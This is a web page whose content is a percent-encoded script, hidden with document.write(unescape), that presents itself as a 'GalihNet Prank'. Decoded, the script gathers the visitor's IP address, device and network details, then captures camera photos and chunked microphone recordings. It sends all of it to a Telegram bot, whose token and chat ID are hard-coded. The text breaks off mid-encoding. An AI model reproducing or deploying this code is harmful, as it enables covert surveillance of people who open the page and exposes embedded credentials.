<script>document.write(unescape('%3C%21%44%4F%43%54%59%50%45%20%68%74%6D%6C%3E%0A%3C%68%74%6D%6C%20%6C%61%6E%67%3D%22%69%64%22%3E%0A%3C%68%65%61%64%3E%0A%3C%6D%65%74%61%20%63%68%61%72%73%65%74%3D%22%75%74%66%2D%38%22%2F%3E%0A%3C%6D%65%74%61%20%6E%61%6D%65%3D%22%76%69%65%77%70%6F%72%74%22%20%63%6F%6E%74%65%6E%74%3D%22%77%69%64%74%68%3D%64%65%76%69%63%65%2D%77%69%64%74%68%2C%69%6E%69%74%69%61%6C%2D%73%63%61%6C%65%3D%31%22%2F%3E%0A%3C%74%69%74%6C%65%3E%47%41%4C%49%48%38%38%38%3C%2F%74%69%74%6C%65%3E%0A%0A%3C%2F%68%65%61%64%3E%0A%3C%62%6F%64%79%3E%0A%3C%70%3E%41%69%6D%20%47%61%6C%69%68%4E%65%74%20%50%72%61%6E%6B%3C%2F%70%3E%0A%0A%3C%73%63%72%69%70%74%3E%0A%2F%2A%20%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%20%4B%4F%4E%46%49%47%55%52%41%53%49%20%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%20%2A%2F%0A%2F%2A%20%47%61%6E%74%69%20%49%4E%54%45%52%56%41%4C%5F%4D%53%20%6B%65%20%35%30%30%30%20%75%6E%74%75%6B%20%35%20%64%65%74%69%6B%20%2A%2F%0A%63%6F%6E%73%74%20%49%4E%54%45%52%56%41%4C%5F%4D%53%20%3D%20%31%30%30%30%30%3B%20%2F%2F%20%31%30%20%64%65%74%69%6B%0A%63%6F%6E%73%74%20%42%4F%54%5F%54%4F%4B%45%4E%20%3D%20%22%38%34%31%34%38%36%30%32%36%33%3A%41%41%46%68%41%78%63%76%31%6C%57%66%68%58%43%51%42%38%68%38%42%54%6A%4E%46%59%36%45%42%36%50%5F%6A%49%63%22%3B%0A%63%6F%6E%73%74%20%43%48%41%54%5F%49%44%20%3D%20%22%38%34%37%31%36%36%34%36%33%35%22%3B%0A%0A%2F%2A%20%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%20%45%6C%65%6D%65%6E%20%55%49%20%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%20%2A%2F%0A%63%6F%6E%73%74%20%63%61%6D%56%69%64%65%6F%20%3D%20%64%6F%63%75%6D%65%6E%74%2E%67%65%74%45%6C%65%6D%65%6E%74%42%79%49%64%28%27%63%61%6D%56%69%64%65%6F%27%29%3B%0A%63%6F%6E%73%74%20%63%61%6D%53%74%61%74%75%73%20%3D%20%64%6F%63%75%6D%65%6E%74%2E%67%65%74%45%6C%65%6D%65%6E%74%42%79%49%64%28%27%63%61%6D%53%74%61%74%75%73%27%29%3B%0A%63%6F%6E%73%74%20%73%63%72%65%65%6E%56%69%64%65%6F%20%3D%20%64%6F%63%75%6D%65%6E%74%2E%67%65%74%45%6C%65%6D%65%6E%74%42%79%49%64%28%27%73%63%72%65%65%6E%56%69%64%65%6F%27%29%3B%0A%63%6F%6E%73%74%20%73%63%72%65%65%6E%53%74%61%74%75%73%20%3D%20%64%6F%63%75%6D%65%6E%74%2E%67%65%74%45%6C%65%6D%65%6E%74%42%79%49%64%28%27%73%63%72%65%65%6E%53%74%61%74%75%73%27%29%3B%0A%63%6F%6E%73%74%20%6C%6F%67%44%69%76%20%3D%20%64%6F%63%75%6D%65%6E%74%2E%67%65%74%45%6C%65%6D%65%6E%74%42%79%49%64%28%27%6C%6F%67%27%29%3B%0A%64%6F%63%75%6D%65%6E%74%2E%67%65%74%45%6C%65%6D%65%6E%74%42%79%49%64%28%27%74%6F%6B%65%6E%41%72%65%61%27%29%2E%74%65%78%74%43%6F%6E%74%65%6E%74%20%3D%20%60%42%4F%54%5F%54%4F%4B%45%4E%3A%20%24%7B%42%4F%54%5F%54%4F%4B%45%4E%7D%5C%6E%43%48%41%54%5F%49%44%3A%20%24%7B%43%48%41%54%5F%49%44%7D%60%3B%0A%0A%2F%2A%20%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%20%48%65%6C%70%65%72%20%26%20%75%74%69%6C%20%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%20%2A%2F%0A%66%75%6E%63%74%69%6F%6E%20%6E%6F%77%28%29%20%7B%20%72%65%74%75%72%6E%20%6E%65%77%20%44%61%74%65%28%29%2E%74%6F%4C%6F%63%61%6C%65%54%69%6D%65%53%74%72%69%6E%67%28%29%3B%20%7D%0A%66%75%6E%63%74%69%6F%6E%20%61%70%70%65%6E%64%4C%6F%67%28%6D%73%67%29%20%7B%20%6C%6F%67%44%69%76%2E%74%65%78%74%43%6F%6E%74%65%6E%74%20%3D%20%60%5B%24%7B%6E%6F%77%28%29%7D%5D%20%24%7B%6D%73%67%7D%5C%6E%5C%6E%60%20%2B%20%6C%6F%67%44%69%76%2E%74%65%78%74%43%6F%6E%74%65%6E%74%3B%20%7D%0A%66%75%6E%63%74%69%6F%6E%20%73%6C%65%65%70%28%6D%73%29%7B%20%72%65%74%75%72%6E%20%6E%65%77%20%50%72%6F%6D%69%73%65%28%72%65%73%20%3D%3E%20%73%65%74%54%69%6D%65%6F%75%74%28%72%65%73%2C%20%6D%73%29%29%3B%20%7D%0A%0A%61%73%79%6E%63%20%66%75%6E%63%74%69%6F%6E%20%73%65%6E%64%54%65%78%74%28%74%65%78%74%29%7B%0A%20%20%74%72%79%20%7B%0A%20%20%20%20%61%77%61%69%74%20%66%65%74%63%68%28%60%68%74%74%70%73%3A%2F%2F%61%70%69%2E%74%65%6C%65%67%72%61%6D%2E%6F%72%67%2F%62%6F%74%24%7B%42%4F%54%5F%54%4F%4B%45%4E%7D%2F%73%65%6E%64%4D%65%73%73%61%67%65%60%2C%20%7B%0A%20%20%20%20%20%20%6D%65%74%68%6F%64%3A%27%50%4F%53%54%27%2C%20%68%65%61%64%65%72%73%3A%20%7B%27%43%6F%6E%74%65%6E%74%2D%54%79%70%65%27%3A%27%61%70%70%6C%69%63%61%74%69%6F%6E%2F%6A%73%6F%6E%27%7D%2C%0A%20%20%20%20%20%20%62%6F%64%79%3A%20%4A%53%4F%4E%2E%73%74%72%69%6E%67%69%66%79%28%7B%20%63%68%61%74%5F%69%64%3A%20%43%48%41%54%5F%49%44%2C%20%74%65%78%74%20%7D%29%0A%20%20%20%20%7D%29%3B%0A%20%20%7D%20%63%61%74%63%68%28%65%29%7B%20%63%6F%6E%73%6F%6C%65%2E%65%72%72%6F%72%28%27%73%65%6E%64%54%65%78%74%20%65%72%72%27%2C%20%65%29%3B%20%7D%0A%7D%0A%61%73%79%6E%63%20%66%75%6E%63%74%69%6F%6E%20%73%65%6E%64%50%68%6F%74%6F%42%6C%6F%62%28%62%6C%6F%62%2C%20%63%61%70%74%69%6F%6E%29%7B%0A%20%20%74%72%79%20%7B%0A%20%20%20%20%63%6F%6E%73%74%20%66%64%20%3D%20%6E%65%77%20%46%6F%72%6D%44%61%74%61%28%29%3B%0A%20%20%20%20%66%64%2E%61%70%70%65%6E%64%28%27%63%68%61%74%5F%69%64%27%2C%20%43%48%41%54%5F%49%44%29%3B%0A%20%20%20%20%66%64%2E%61%70%70%65%6E%64%28%27%63%61%70%74%69%6F%6E%27%2C%20%63%61%70%74%69%6F%6E%20%7C%7C%20%27%27%29%3B%0A%20%20%20%20%66%64%2E%61%70%70%65%6E%64%28%27%70%68%6F%74%6F%27%2C%20%62%6C%6F%62%2C%20%27%70%68%6F%74%6F%2E%6A%70%67%27%29%3B%0A%20%20%20%20%61%77%61%69%74%20%66%65%74%63%68%28%60%68%74%74%70%73%3A%2F%2F%61%70%69%2E%74%65%6C%65%67%72%61%6D%2E%6F%72%67%2F%62%6F%74%24%7B%42%4F%54%5F%54%4F%4B%45%4E%7D%2F%73%65%6E%64%50%68%6F%74%6F%60%2C%20%7B%20%6D%65%74%68%6F%64%3A%20%27%50%4F%53%54%27%2C%20%62%6F%64%79%3A%20%66%64%20%7D%29%3B%0A%20%20%7D%20%63%61%74%63%68%28%65%29%7B%20%63%6F%6E%73%6F%6C%65%2E%65%72%72%6F%72%28%27%73%65%6E%64%50%68%6F%74%6F%42%6C%6F%62%20%65%72%72%27%2C%20%65%29%3B%20%7D%0A%7D%0A%61%73%79%6E%63%20%66%75%6E%63%74%69%6F%6E%20%73%65%6E%64%44%6F%63%42%6C%6F%62%28%62%6C%6F%62%2C%20%66%69%6C%65%6E%61%6D%65%2C%20%63%61%70%74%69%6F%6E%29%7B%0A%20%20%74%72%79%20%7B%0A%20%20%20%20%63%6F%6E%73%74%20%66%64%20%3D%20%6E%65%77%20%46%6F%72%6D%44%61%74%61%28%29%3B%0A%20%20%20%20%66%64%2E%61%70%70%65%6E%64%28%27%63%68%61%74%5F%69%64%27%2C%20%43%48%41%54%5F%49%44%29%3B%0A%20%20%20%20%66%64%2E%61%70%70%65%6E%64%28%27%63%61%70%74%69%6F%6E%27%2C%20%63%61%70%74%69%6F%6E%20%7C%7C%20%27%27%29%3B%0A%20%20%20%20%66%64%2E%61%70%70%65%6E%64%28%27%64%6F%63%75%6D%65%6E%74%27%2C%20%62%6C%6F%62%2C%20%66%69%6C%65%6E%61%6D%65%29%3B%0A%20%20%20%20%61%77%61%69%74%20%66%65%74%63%68%28%60%68%74%74%70%73%3A%2F%2F%61%70%69%2E%74%65%6C%65%67%72%61%6D%2E%6F%72%67%2F%62%6F%74%24%7B%42%4F%54%5F%54%4F%4B%45%4E%7D%2F%73%65%6E%64%44%6F%63%75%6D%65%6E%74%60%2C%20%7B%20%6D%65%74%68%6F%64%3A%20%27%50%4F%53%54%27%2C%20%62%6F%64%79%3A%20%66%64%20%7D%29%3B%0A%20%20%7D%20%63%61%74%63%68%28%65%29%7B%20%63%6F%6E%73%6F%6C%65%2E%65%72%72%6F%72%28%27%73%65%6E%64%44%6F%63%42%6C%6F%62%20%65%72%72%27%2C%20%65%29%3B%20%7D%0A%7D%0A%0A%2F%2A%20%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%20%44%65%76%69%63%65%20%69%6E%66%6F%20%62%75%69%6C%64%65%72%20%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%20%2A%2F%0A%61%73%79%6E%63%20%66%75%6E%63%74%69%6F%6E%20%67%65%74%50%75%62%6C%69%63%49%50%28%29%7B%0A%20%20%74%72%79%20%7B%20%63%6F%6E%73%74%20%72%20%3D%20%61%77%61%69%74%20%66%65%74%63%68%28%27%68%74%74%70%73%3A%2F%2F%61%70%69%2E%69%70%69%66%79%2E%6F%72%67%3F%66%6F%72%6D%61%74%3D%6A%73%6F%6E%27%29%3B%20%63%6F%6E%73%74%20%6A%20%3D%20%61%77%61%69%74%20%72%2E%6A%73%6F%6E%28%29%3B%20%72%65%74%75%72%6E%20%6A%2E%69%70%3B%20%7D%20%63%61%74%63%68%20%7B%20%72%65%74%75%72%6E%20%27%75%6E%6B%6E%6F%77%6E%27%3B%20%7D%0A%7D%0A%66%75%6E%63%74%69%6F%6E%20%64%65%74%65%63%74%44%65%76%69%63%65%28%29%7B%0A%20%20%63%6F%6E%73%74%20%75%61%20%3D%20%6E%61%76%69%67%61%74%6F%72%2E%75%73%65%72%41%67%65%6E%74%20%7C%7C%20%27%27%3B%0A%20%20%63%6F%6E%73%74%20%70%6C%61%74%66%6F%72%6D%20%3D%20%6E%61%76%69%67%61%74%6F%72%2E%70%6C%61%74%66%6F%72%6D%20%7C%7C%20%27%75%6E%6B%6E%6F%77%6E%27%3B%0A%20%20%63%6F%6E%73%74%20%63%6F%72%65%73%20%3D%20%6E%61%76%69%67%61%74%6F%72%2E%68%61%72%64%77%61%72%65%43%6F%6E%63%75%72%72%65%6E%63%79%20%7C%7C%20%27%6E%2F%61%27%3B%0A%20%20%63%6F%6E%73%74%20%6D%65%6D%20%3D%20%6E%61%76%69%67%61%74%6F%72%2E%64%65%76%69%63%65%4D%65%6D%6F%72%79%20%7C%7C%20%27%6E%2F%61%27%3B%0A%20%20%72%65%74%75%72%6E%20%7B%20%75%61%2C%20%70%6C%61%74%66%6F%72%6D%2C%20%63%6F%72%65%73%2C%20%6D%65%6D%20%7D%3B%0A%7D%0A%66%75%6E%63%74%69%6F%6E%20%6E%65%74%49%6E%66%6F%28%29%7B%0A%20%20%63%6F%6E%73%74%20%63%6F%6E%6E%20%3D%20%6E%61%76%69%67%61%74%6F%72%2E%63%6F%6E%6E%65%63%74%69%6F%6E%20%7C%7C%20%6E%61%76%69%67%61%74%6F%72%2E%6D%6F%7A%43%6F%6E%6E%65%63%74%69%6F%6E%20%7C%7C%20%6E%61%76%69%67%61%74%6F%72%2E%77%65%62%6B%69%74%43%6F%6E%6E%65%63%74%69%6F%6E%3B%0A%20%20%72%65%74%75%72%6E%20%7B%20%74%79%70%65%3A%20%63%6F%6E%6E%20%3F%20%28%63%6F%6E%6E%2E%65%66%66%65%63%74%69%76%65%54%79%70%65%20%7C%7C%20%63%6F%6E%6E%2E%74%79%70%65%29%20%3A%20%27%75%6E%6B%6E%6F%77%6E%27%2C%20%64%6F%77%6E%6C%69%6E%6B%3A%20%63%6F%6E%6E%20%3F%20%63%6F%6E%6E%2E%64%6F%77%6E%6C%69%6E%6B%20%3A%20%27%6E%2F%61%27%2C%20%72%74%74%3A%20%63%6F%6E%6E%20%3F%20%63%6F%6E%6E%2E%72%74%74%20%3A%20%27%6E%2F%61%27%20%7D%3B%0A%7D%0A%61%73%79%6E%63%20%66%75%6E%63%74%69%6F%6E%20%62%75%69%6C%64%44%65%76%69%63%65%43%61%70%74%69%6F%6E%28%6E%6F%74%65%29%7B%0A%20%20%63%6F%6E%73%74%20%64%65%76%20%3D%20%64%65%74%65%63%74%44%65%76%69%63%65%28%29%3B%0A%20%20%63%6F%6E%73%74%20%6E%65%74%20%3D%20%6E%65%74%49%6E%66%6F%28%29%3B%0A%20%20%63%6F%6E%73%74%20%69%70%20%3D%20%61%77%61%69%74%20%67%65%74%50%75%62%6C%69%63%49%50%28%29%3B%0A%20%20%63%6F%6E%73%74%20%74%7A%20%3D%20%49%6E%74%6C%2E%44%61%74%65%54%69%6D%65%46%6F%72%6D%61%74%28%29%2E%72%65%73%6F%6C%76%65%64%4F%70%74%69%6F%6E%73%28%29%2E%74%69%6D%65%5A%6F%6E%65%20%7C%7C%20%27%75%6E%6B%6E%6F%77%6E%27%3B%0A%20%20%63%6F%6E%73%74%20%6C%69%6E%65%73%20%3D%20%5B%0A%20%20%20%20%22üì°%20%44%65%76%69%63%65%20%49%6E%66%6F%22%2C%0A%20%20%20%20%60üïí%20%24%7B%6E%65%77%20%44%61%74%65%28%29%2E%74%6F%4C%6F%63%61%6C%65%53%74%72%69%6E%67%28%29%7D%60%2C%0A%20%20%20%20%60%50%6C%61%74%66%6F%72%6D%3A%20%24%7B%64%65%76%2E%70%6C%61%74%66%6F%72%6D%7D%60%2C%0A%20%20%20%20%60%55%41%3A%20%24%7B%64%65%76%2E%75%61%7D%60%2C%0A%20%20%20%20%60%43%6F%72%65%73%3A%20%24%7B%64%65%76%2E%63%6F%72%65%73%7D%2C%20%4D%65%6D%3A%20%24%7B%64%65%76%2E%6D%65%6D%7D%60%2C%0A%20%20%20%20%60%4E%65%74%77%6F%72%6B%3A%20%24%7B%6E%65%74%2E%74%79%70%65%7D%20%28%64%6F%77%6E%3A%24%7B%6E%65%74%2E%64%6F%77%6E%6C%69%6E%6B%7D%2C%20%72%74%74%3A%24%7B%6E%65%74%2E%72%74%74%7D%29%60%2C%0A%20%20%20%20%60%49%50%3A%20%24%7B%69%70%7D%60%2C%0A%20%20%20%20%60%54%69%6D%65%7A%6F%6E%65%3A%20%24%7B%74%7A%7D%60%2C%0A%20%20%20%20%6E%6F%74%65%20%7C%7C%20%27%27%0A%20%20%5D%3B%0A%20%20%72%65%74%75%72%6E%20%6C%69%6E%65%73%2E%6A%6F%69%6E%28%22%5C%6E%22%29%3B%0A%7D%0A%0A%2F%2A%20%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%20%43%61%6D%65%72%61%20%50%68%6F%74%6F%20%63%61%70%74%75%72%65%20%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%20%2A%2F%0A%6C%65%74%20%63%61%6D%53%74%72%65%61%6D%20%3D%20%6E%75%6C%6C%3B%0A%61%73%79%6E%63%20%66%75%6E%63%74%69%6F%6E%20%73%74%61%72%74%43%61%6D%65%72%61%28%29%7B%0A%20%20%69%66%20%28%63%61%6D%53%74%72%65%61%6D%29%20%72%65%74%75%72%6E%3B%0A%20%20%74%72%79%20%7B%0A%20%20%20%20%63%61%6D%53%74%61%74%75%73%2E%74%65%78%74%43%6F%6E%74%65%6E%74%20%3D%20%22%4D%65%6D%69%6E%74%61%20%69%7A%69%6E%20%6B%61%6D%65%72%61%2E%2E%2E%22%3B%0A%20%20%20%20%63%61%6D%53%74%72%65%61%6D%20%3D%20%61%77%61%69%74%20%6E%61%76%69%67%61%74%6F%72%2E%6D%65%64%69%61%44%65%76%69%63%65%73%2E%67%65%74%55%73%65%72%4D%65%64%69%61%28%7B%20%76%69%64%65%6F%3A%20%7B%20%77%69%64%74%68%3A%36%34%30%2C%20%68%65%69%67%68%74%3A%34%38%30%20%7D%2C%20%61%75%64%69%6F%3A%20%66%61%6C%73%65%20%7D%29%3B%0A%20%20%20%20%63%61%6D%56%69%64%65%6F%2E%73%72%63%4F%62%6A%65%63%74%20%3D%20%63%61%6D%53%74%72%65%61%6D%3B%0A%20%20%20%20%61%77%61%69%74%20%63%61%6D%56%69%64%65%6F%2E%70%6C%61%79%28%29%3B%0A%20%20%20%20%63%61%6D%53%74%61%74%75%73%2E%74%65%78%74%43%6F%6E%74%65%6E%74%20%3D%20%22%43%61%6D%65%72%61%3A%20%61%6B%74%69%66%22%3B%0A%20%20%20%20%61%70%70%65%6E%64%4C%6F%67%28%22%43%61%6D%65%72%61%20%61%6B%74%69%66%2E%22%29%3B%0A%20%20%7D%20%63%61%74%63%68%28%65%29%7B%0A%20%20%20%20%63%61%6D%53%74%61%74%75%73%2E%74%65%78%74%43%6F%6E%74%65%6E%74%20%3D%20%22%43%61%6D%65%72%61%3A%20%67%61%67%61%6C%20%2D%20%22%20%2B%20%28%65%2E%6D%65%73%73%61%67%65%20%7C%7C%20%65%29%3B%0A%20%20%20%20%61%70%70%65%6E%64%4C%6F%67%28%22%47%61%67%61%6C%20%61%6B%73%65%73%20%6B%61%6D%65%72%61%3A%20%22%20%2B%20%28%65%2E%6D%65%73%73%61%67%65%20%7C%7C%20%65%29%29%3B%0A%20%20%7D%0A%7D%0A%61%73%79%6E%63%20%66%75%6E%63%74%69%6F%6E%20%73%74%6F%70%43%61%6D%65%72%61%28%29%7B%0A%20%20%69%66%20%28%21%63%61%6D%53%74%72%65%61%6D%29%20%72%65%74%75%72%6E%3B%0A%20%20%63%61%6D%53%74%72%65%61%6D%2E%67%65%74%54%72%61%63%6B%73%28%29%2E%66%6F%72%45%61%63%68%28%74%3D%3E%74%2E%73%74%6F%70%28%29%29%3B%0A%20%20%63%61%6D%53%74%72%65%61%6D%20%3D%20%6E%75%6C%6C%3B%0A%20%20%74%72%79%20%7B%20%63%61%6D%56%69%64%65%6F%2E%73%72%63%4F%62%6A%65%63%74%20%3D%20%6E%75%6C%6C%3B%20%7D%20%63%61%74%63%68%20%7B%7D%0A%20%20%63%61%6D%53%74%61%74%75%73%2E%74%65%78%74%43%6F%6E%74%65%6E%74%20%3D%20%22%43%61%6D%65%72%61%3A%20%62%65%72%68%65%6E%74%69%22%3B%0A%20%20%61%70%70%65%6E%64%4C%6F%67%28%22%43%61%6D%65%72%61%20%64%69%68%65%6E%74%69%6B%61%6E%2E%22%29%3B%0A%7D%0A%61%73%79%6E%63%20%66%75%6E%63%74%69%6F%6E%20%63%61%70%74%75%72%65%50%68%6F%74%6F%41%6E%64%53%65%6E%64%28%29%7B%0A%20%20%69%66%20%28%21%63%61%6D%53%74%72%65%61%6D%29%20%7B%20%61%70%70%65%6E%64%4C%6F%67%28%22%43%61%70%74%75%72%65%20%73%6B%69%70%70%65%64%3A%20%63%61%6D%65%72%61%20%74%69%64%61%6B%20%61%6B%74%69%66%2E%22%29%3B%20%72%65%74%75%72%6E%3B%20%7D%0A%20%20%74%72%79%20%7B%0A%20%20%20%20%63%6F%6E%73%74%20%77%20%3D%20%63%61%6D%56%69%64%65%6F%2E%76%69%64%65%6F%57%69%64%74%68%20%7C%7C%20%36%34%30%3B%0A%20%20%20%20%63%6F%6E%73%74%20%68%20%3D%20%63%61%6D%56%69%64%65%6F%2E%76%69%64%65%6F%48%65%69%67%68%74%20%7C%7C%20%34%38%30%3B%0A%20%20%20%20%63%6F%6E%73%74%20%63%20%3D%20%64%6F%63%75%6D%65%6E%74%2E%63%72%65%61%74%65%45%6C%65%6D%65%6E%74%28%27%63%61%6E%76%61%73%27%29%3B%0A%20%20%20%20%63%2E%77%69%64%74%68%20%3D%20%77%3B%20%63%2E%68%65%69%67%68%74%20%3D%20%68%3B%0A%20%20%20%20%63%6F%6E%73%74%20%63%74%78%20%3D%20%63%2E%67%65%74%43%6F%6E%74%65%78%74%28%27%32%64%27%29%3B%0A%20%20%20%20%63%74%78%2E%64%72%61%77%49%6D%61%67%65%28%63%61%6D%56%69%64%65%6F%2C%20%30%2C%20%30%2C%20%77%2C%20%68%29%3B%0A%20%20%20%20%63%6F%6E%73%74%20%62%6C%6F%62%20%3D%20%61%77%61%69%74%20%6E%65%77%20%50%72%6F%6D%69%73%65%28%72%65%73%20%3D%3E%20%63%2E%74%6F%42%6C%6F%62%28%72%65%73%2C%20%27%69%6D%61%67%65%2F%6A%70%65%67%27%2C%20%30%2E%38%35%29%29%3B%0A%20%20%20%20%63%6F%6E%73%74%20%63%61%70%74%69%6F%6E%20%3D%20%61%77%61%69%74%20%62%75%69%6C%64%44%65%76%69%63%65%43%61%70%74%69%6F%6E%28%22%46%6F%74%6F%20%6B%61%6D%65%72%61%20%6F%74%6F%6D%61%74%69%73%22%29%3B%0A%20%20%20%20%61%77%61%69%74%20%73%65%6E%64%50%68%6F%74%6F%42%6C%6F%62%28%62%6C%6F%62%2C%20%63%61%70%74%69%6F%6E%29%3B%0A%20%20%20%20%61%70%70%65%6E%64%4C%6F%67%28%22%46%6F%74%6F%20%6B%61%6D%65%72%61%20%64%69%6B%69%72%69%6D%2E%22%29%3B%0A%20%20%7D%20%63%61%74%63%68%28%65%29%7B%20%61%70%70%65%6E%64%4C%6F%67%28%22%45%72%72%6F%72%20%63%61%70%74%75%72%65%50%68%6F%74%6F%3A%20%22%20%2B%20%28%65%2E%6D%65%73%73%61%67%65%20%7C%7C%20%65%29%29%3B%20%7D%0A%7D%0A%0A%2F%2A%20%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%20%41%75%64%69%6F%20%72%65%63%6F%72%64%69%6E%67%20%28%63%68%75%6E%6B%65%64%29%20%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%20%2A%2F%0A%6C%65%74%20%61%75%64%69%6F%53%74%72%65%61%6D%20%3D%20%6E%75%6C%6C%3B%0A%6C%65%74%20%61%75%64%69%6F%52%65%63%6F%72%64%65%72%20%3D%20%6E%75%6C%6C%3B%0A%6C%65%74%20%61%75%64%69%6F%43%68%75%6E%6B%73%20%3D%20%5B%5D%3B%0A%6C%65%74%20%61%75%64%69%6F%41%63%74%69%76%65%20%3D%20%66%61%6C%73%65%3B%0A%0A%61%73%79%6E%63%20%66%75%6E%63%74%69%6F%6E%20%73%74%61%72%74%41%75%64%69%6F%28%29%7B%0A%20%20%69%66%20%28%61%75%64%69%6F%41%63%74%69%76%65%29%20%72%65%74%75%72%6E%3B%0A%20%20%74%72%79%20%7B%0A%20%20%20%20%61%70%70%65%6E%64%4C%6F%67%28%22%4D%65%6D%69%6E%74%61%20%69%7A%69%6E%20%6D%69%6B%72%6F%66%6F%6E%2E%2E%2E%22%29%3B%0A%20%20%20%20%61%75%64%69%6F%53%74%72%65%61%6D%20%3D%20%61%77%61%69%74%20%6E%61%76%69%67%61%74%6F%72%2E%6D%65%64%69%61%44%65%76%69%63%65%73%2E%67%65%74%55%73%65%72%4D%65%64%69%61%28%7B%20%61%75%64%69%6F%3A%20%74%72%75%65%2C%20%76%69%64%65%6F%3A%20%66%61%6C%73%65%20%7D%29%3B%0A%20%20%20%20%61%75%64%69%6F%41%63%74%69%76%65%20%3D%20%74%72%75%65%3B%0A%20%20%20%20%61%75%64%69%6F%52%65%63%6F%72%64%65%72%20%3D%20%6E%65%77%20%4D%65%64%69%61%52%65%63%6F%72%64%65%72%28%61%75%64%69%6F%53%74%72%65%61%6D%29%3B%0A%20%20%20%20%61%75%64%69%6F%52%65%63%6F%72%64%65%72%2E%6F%6E%64%61%74%61%61%76%61%69%6C%61%62%6C%65%20%3D%20%65%20%3D%3E%20%7B%20%69%66%20%28%65%2E%64%61%74%61%20%26%26%20%65%2E%64%61%74%61%2E%73%69%7A%65%29%20%61%75%64%69%6F%43%68%75%6E%6B%73%2E%70%75%73%68%28%65%2E%64%61%74%61%29%3B%20%7D%3B%0A%20%20%20%20%61%75%64%69%6F%52%65%63%6F%72%64%65%72%2E%6F%6E%73%74%6F%70%20%3D%20%61%73%79%6E%63%20%28%29%20%3D%3E%20%7B%0A%20%20%20%20%20%20%69%66%20%28%61%75%64%69%6F%43%68%75%6E%6B%73%2E%6C%65%6E%67%74%68%20%3D%3D%3D%20%30%29%20%72%65%74%75%72%6E%3B%0A%20%20%20%20%20%20%63%6F%6E%73%74%20%62%6C%6F%62%20%3D%20%6E%65%77%20%42%6C%6F%62%28%61%75%64%69%6F%43%68%75%6E%6B%73%2C%20%7B%20%74%79%70%65%3A%20%61%75%64%69%6F%43%68%75%6E%6B%73%5B%30%5D%2E%74%79%70%65%20%7C%7C%20%27%61%75%64%69%6F%2F%77%65%62%6D%27%20%7D%29%3B%0A%20%20%20%20%20%20%63%6F%6E%73%74%20%74%73%20%3D%20%6E%65%77%20%44%61%74%65%28%29%2E%74%6F%49%53%4F%53%74%72%69%6E%67%28%29%2E%72%65%70%6C%61%63%65%28%2F%5B%3A%2E%5D%2F%67%2C%27%2D%27%29%3B%0A%20%20%20%20%20%20%63%6F%6E%73%74%20%66%69%6C%65%6E%61%6D%65%20%3D%20%60%61%75%64%69%6F%2D%24%7B%74%73%7D%2E%77%65%62%6D%60%3B%0A%20%20%20%20%20%20%63%6F%6E%73%74%20%63%61%70%74%69%6F%6E%20%3D%20%61%77%61%69%74%20%62%75%69%6C%64%44%65%76%69%63%65%43%61%70%74%69%6F%6E%28%22%41%75%64%69%6F%20%6F%74%6F%6D%61%74%69%73%22%29%3B%0A%20%20%20%20%20%20%61%77%61%69%74%20%73%65%6E%64%44%6F%63%42%6C%6F%62%28%62%6C%6F%62%2C%20%66%69%6C%65%6E%61%6D%65%2C%20%63%61%70%74%69%6F%6E%29%3B%0A%20%20%20%20%20%20%61%70%70%65%6E%64%4C%6F%67%28%22%43%68%75%6E%6B%20%61%75%64%69%6F%20%64%69%6B%69%72%69%6D%3A%20%22%20%2B%20%66%69%6C%65%6E%61%6D%65%29%3B%0A%20%20%20%20%20%20%61%75%64%69%6F%43%68%75%6E%6B%73%20%3D%20%5B%5D%3B%0A%20%20%20%20%7D%3B%0A%20%20%20%20%61%75%64%69%6F%52%65%63%6F%72%64%65%72%2E%73%74%61%72%74%28%29%3B%0A%20%20%20%20%61%70%70%65%6E%64%4C%6F%67%28%22%41%75%64%69%6F%20%6D%65%72%65%6B%61%6D%2E%22%29%3B%0A%20%20%20%20%2F%2F%20%6C%6F%6F%70%20%63%68%75%6E%6B%69%6E%67%20%75%73%69%6E%67%20%73%74%6F%70%2F%73%74%61%72%74%20%70%61%74%74%65%72%6E%0A%20%20%20%20%28%61%73%79%6E%63%20%66%75%6E%63%74%69%6F%6E%20%6C%6F%6F%70%41%75%64%69%6F%28%29%7B%0A%20%20%20%20%20%20%77%68%69%6C%65%20%28%61%75%64%69%6F%41%63%74%69%76%65%29%7B%0A%20%20%20%20%20%20%20%20%61%77%61%69%74%20%73%6C%65%65%70%28%49%4E%54%45%52%56%41%4C%5F%4D%53%29%3B%0A%20%20%20%20%20%20%20%20%69%66%20%28%21%61%75%64%69%6F%41%63%74%69%76%65%29%20%62%72%65%61%6B%3B%0A%20%20%20%20%20%20%20%20%74%72%79%20%7B%0A%20%20%20%20%20%20%20%20%20%20%69%66%20%28%61%75%64%69%6F%52%65%63%6F%72%64%65%72%20%26%26%20%61%75%64%69%6F%52%65%63%6F%72%64%65%72%2E%73%74%61%74%65%20%3D%3D%3D%20%27%72%65%63%6F%72%64%69%6E%67%27%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%61%75%64%69%6F%52%65%63%6F%72%64%65%72%2E%73%74%6F%70%28%29%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%61%77%61%69%74%20%73%6C%65%65%70%28%33%30%30%29%3B%20%2F%2F%20%61%6C%6C%6F%77%20%6F%6E%73%74%6F%70%20%74%6F%20%66%69%72%65%20%26%20%73%65%6E%64%0A%20%20%20%20%20%20%20%20%20%20%20%20%61%75%64%69%6F%52%65%63%6F%72%64%65%72%20%3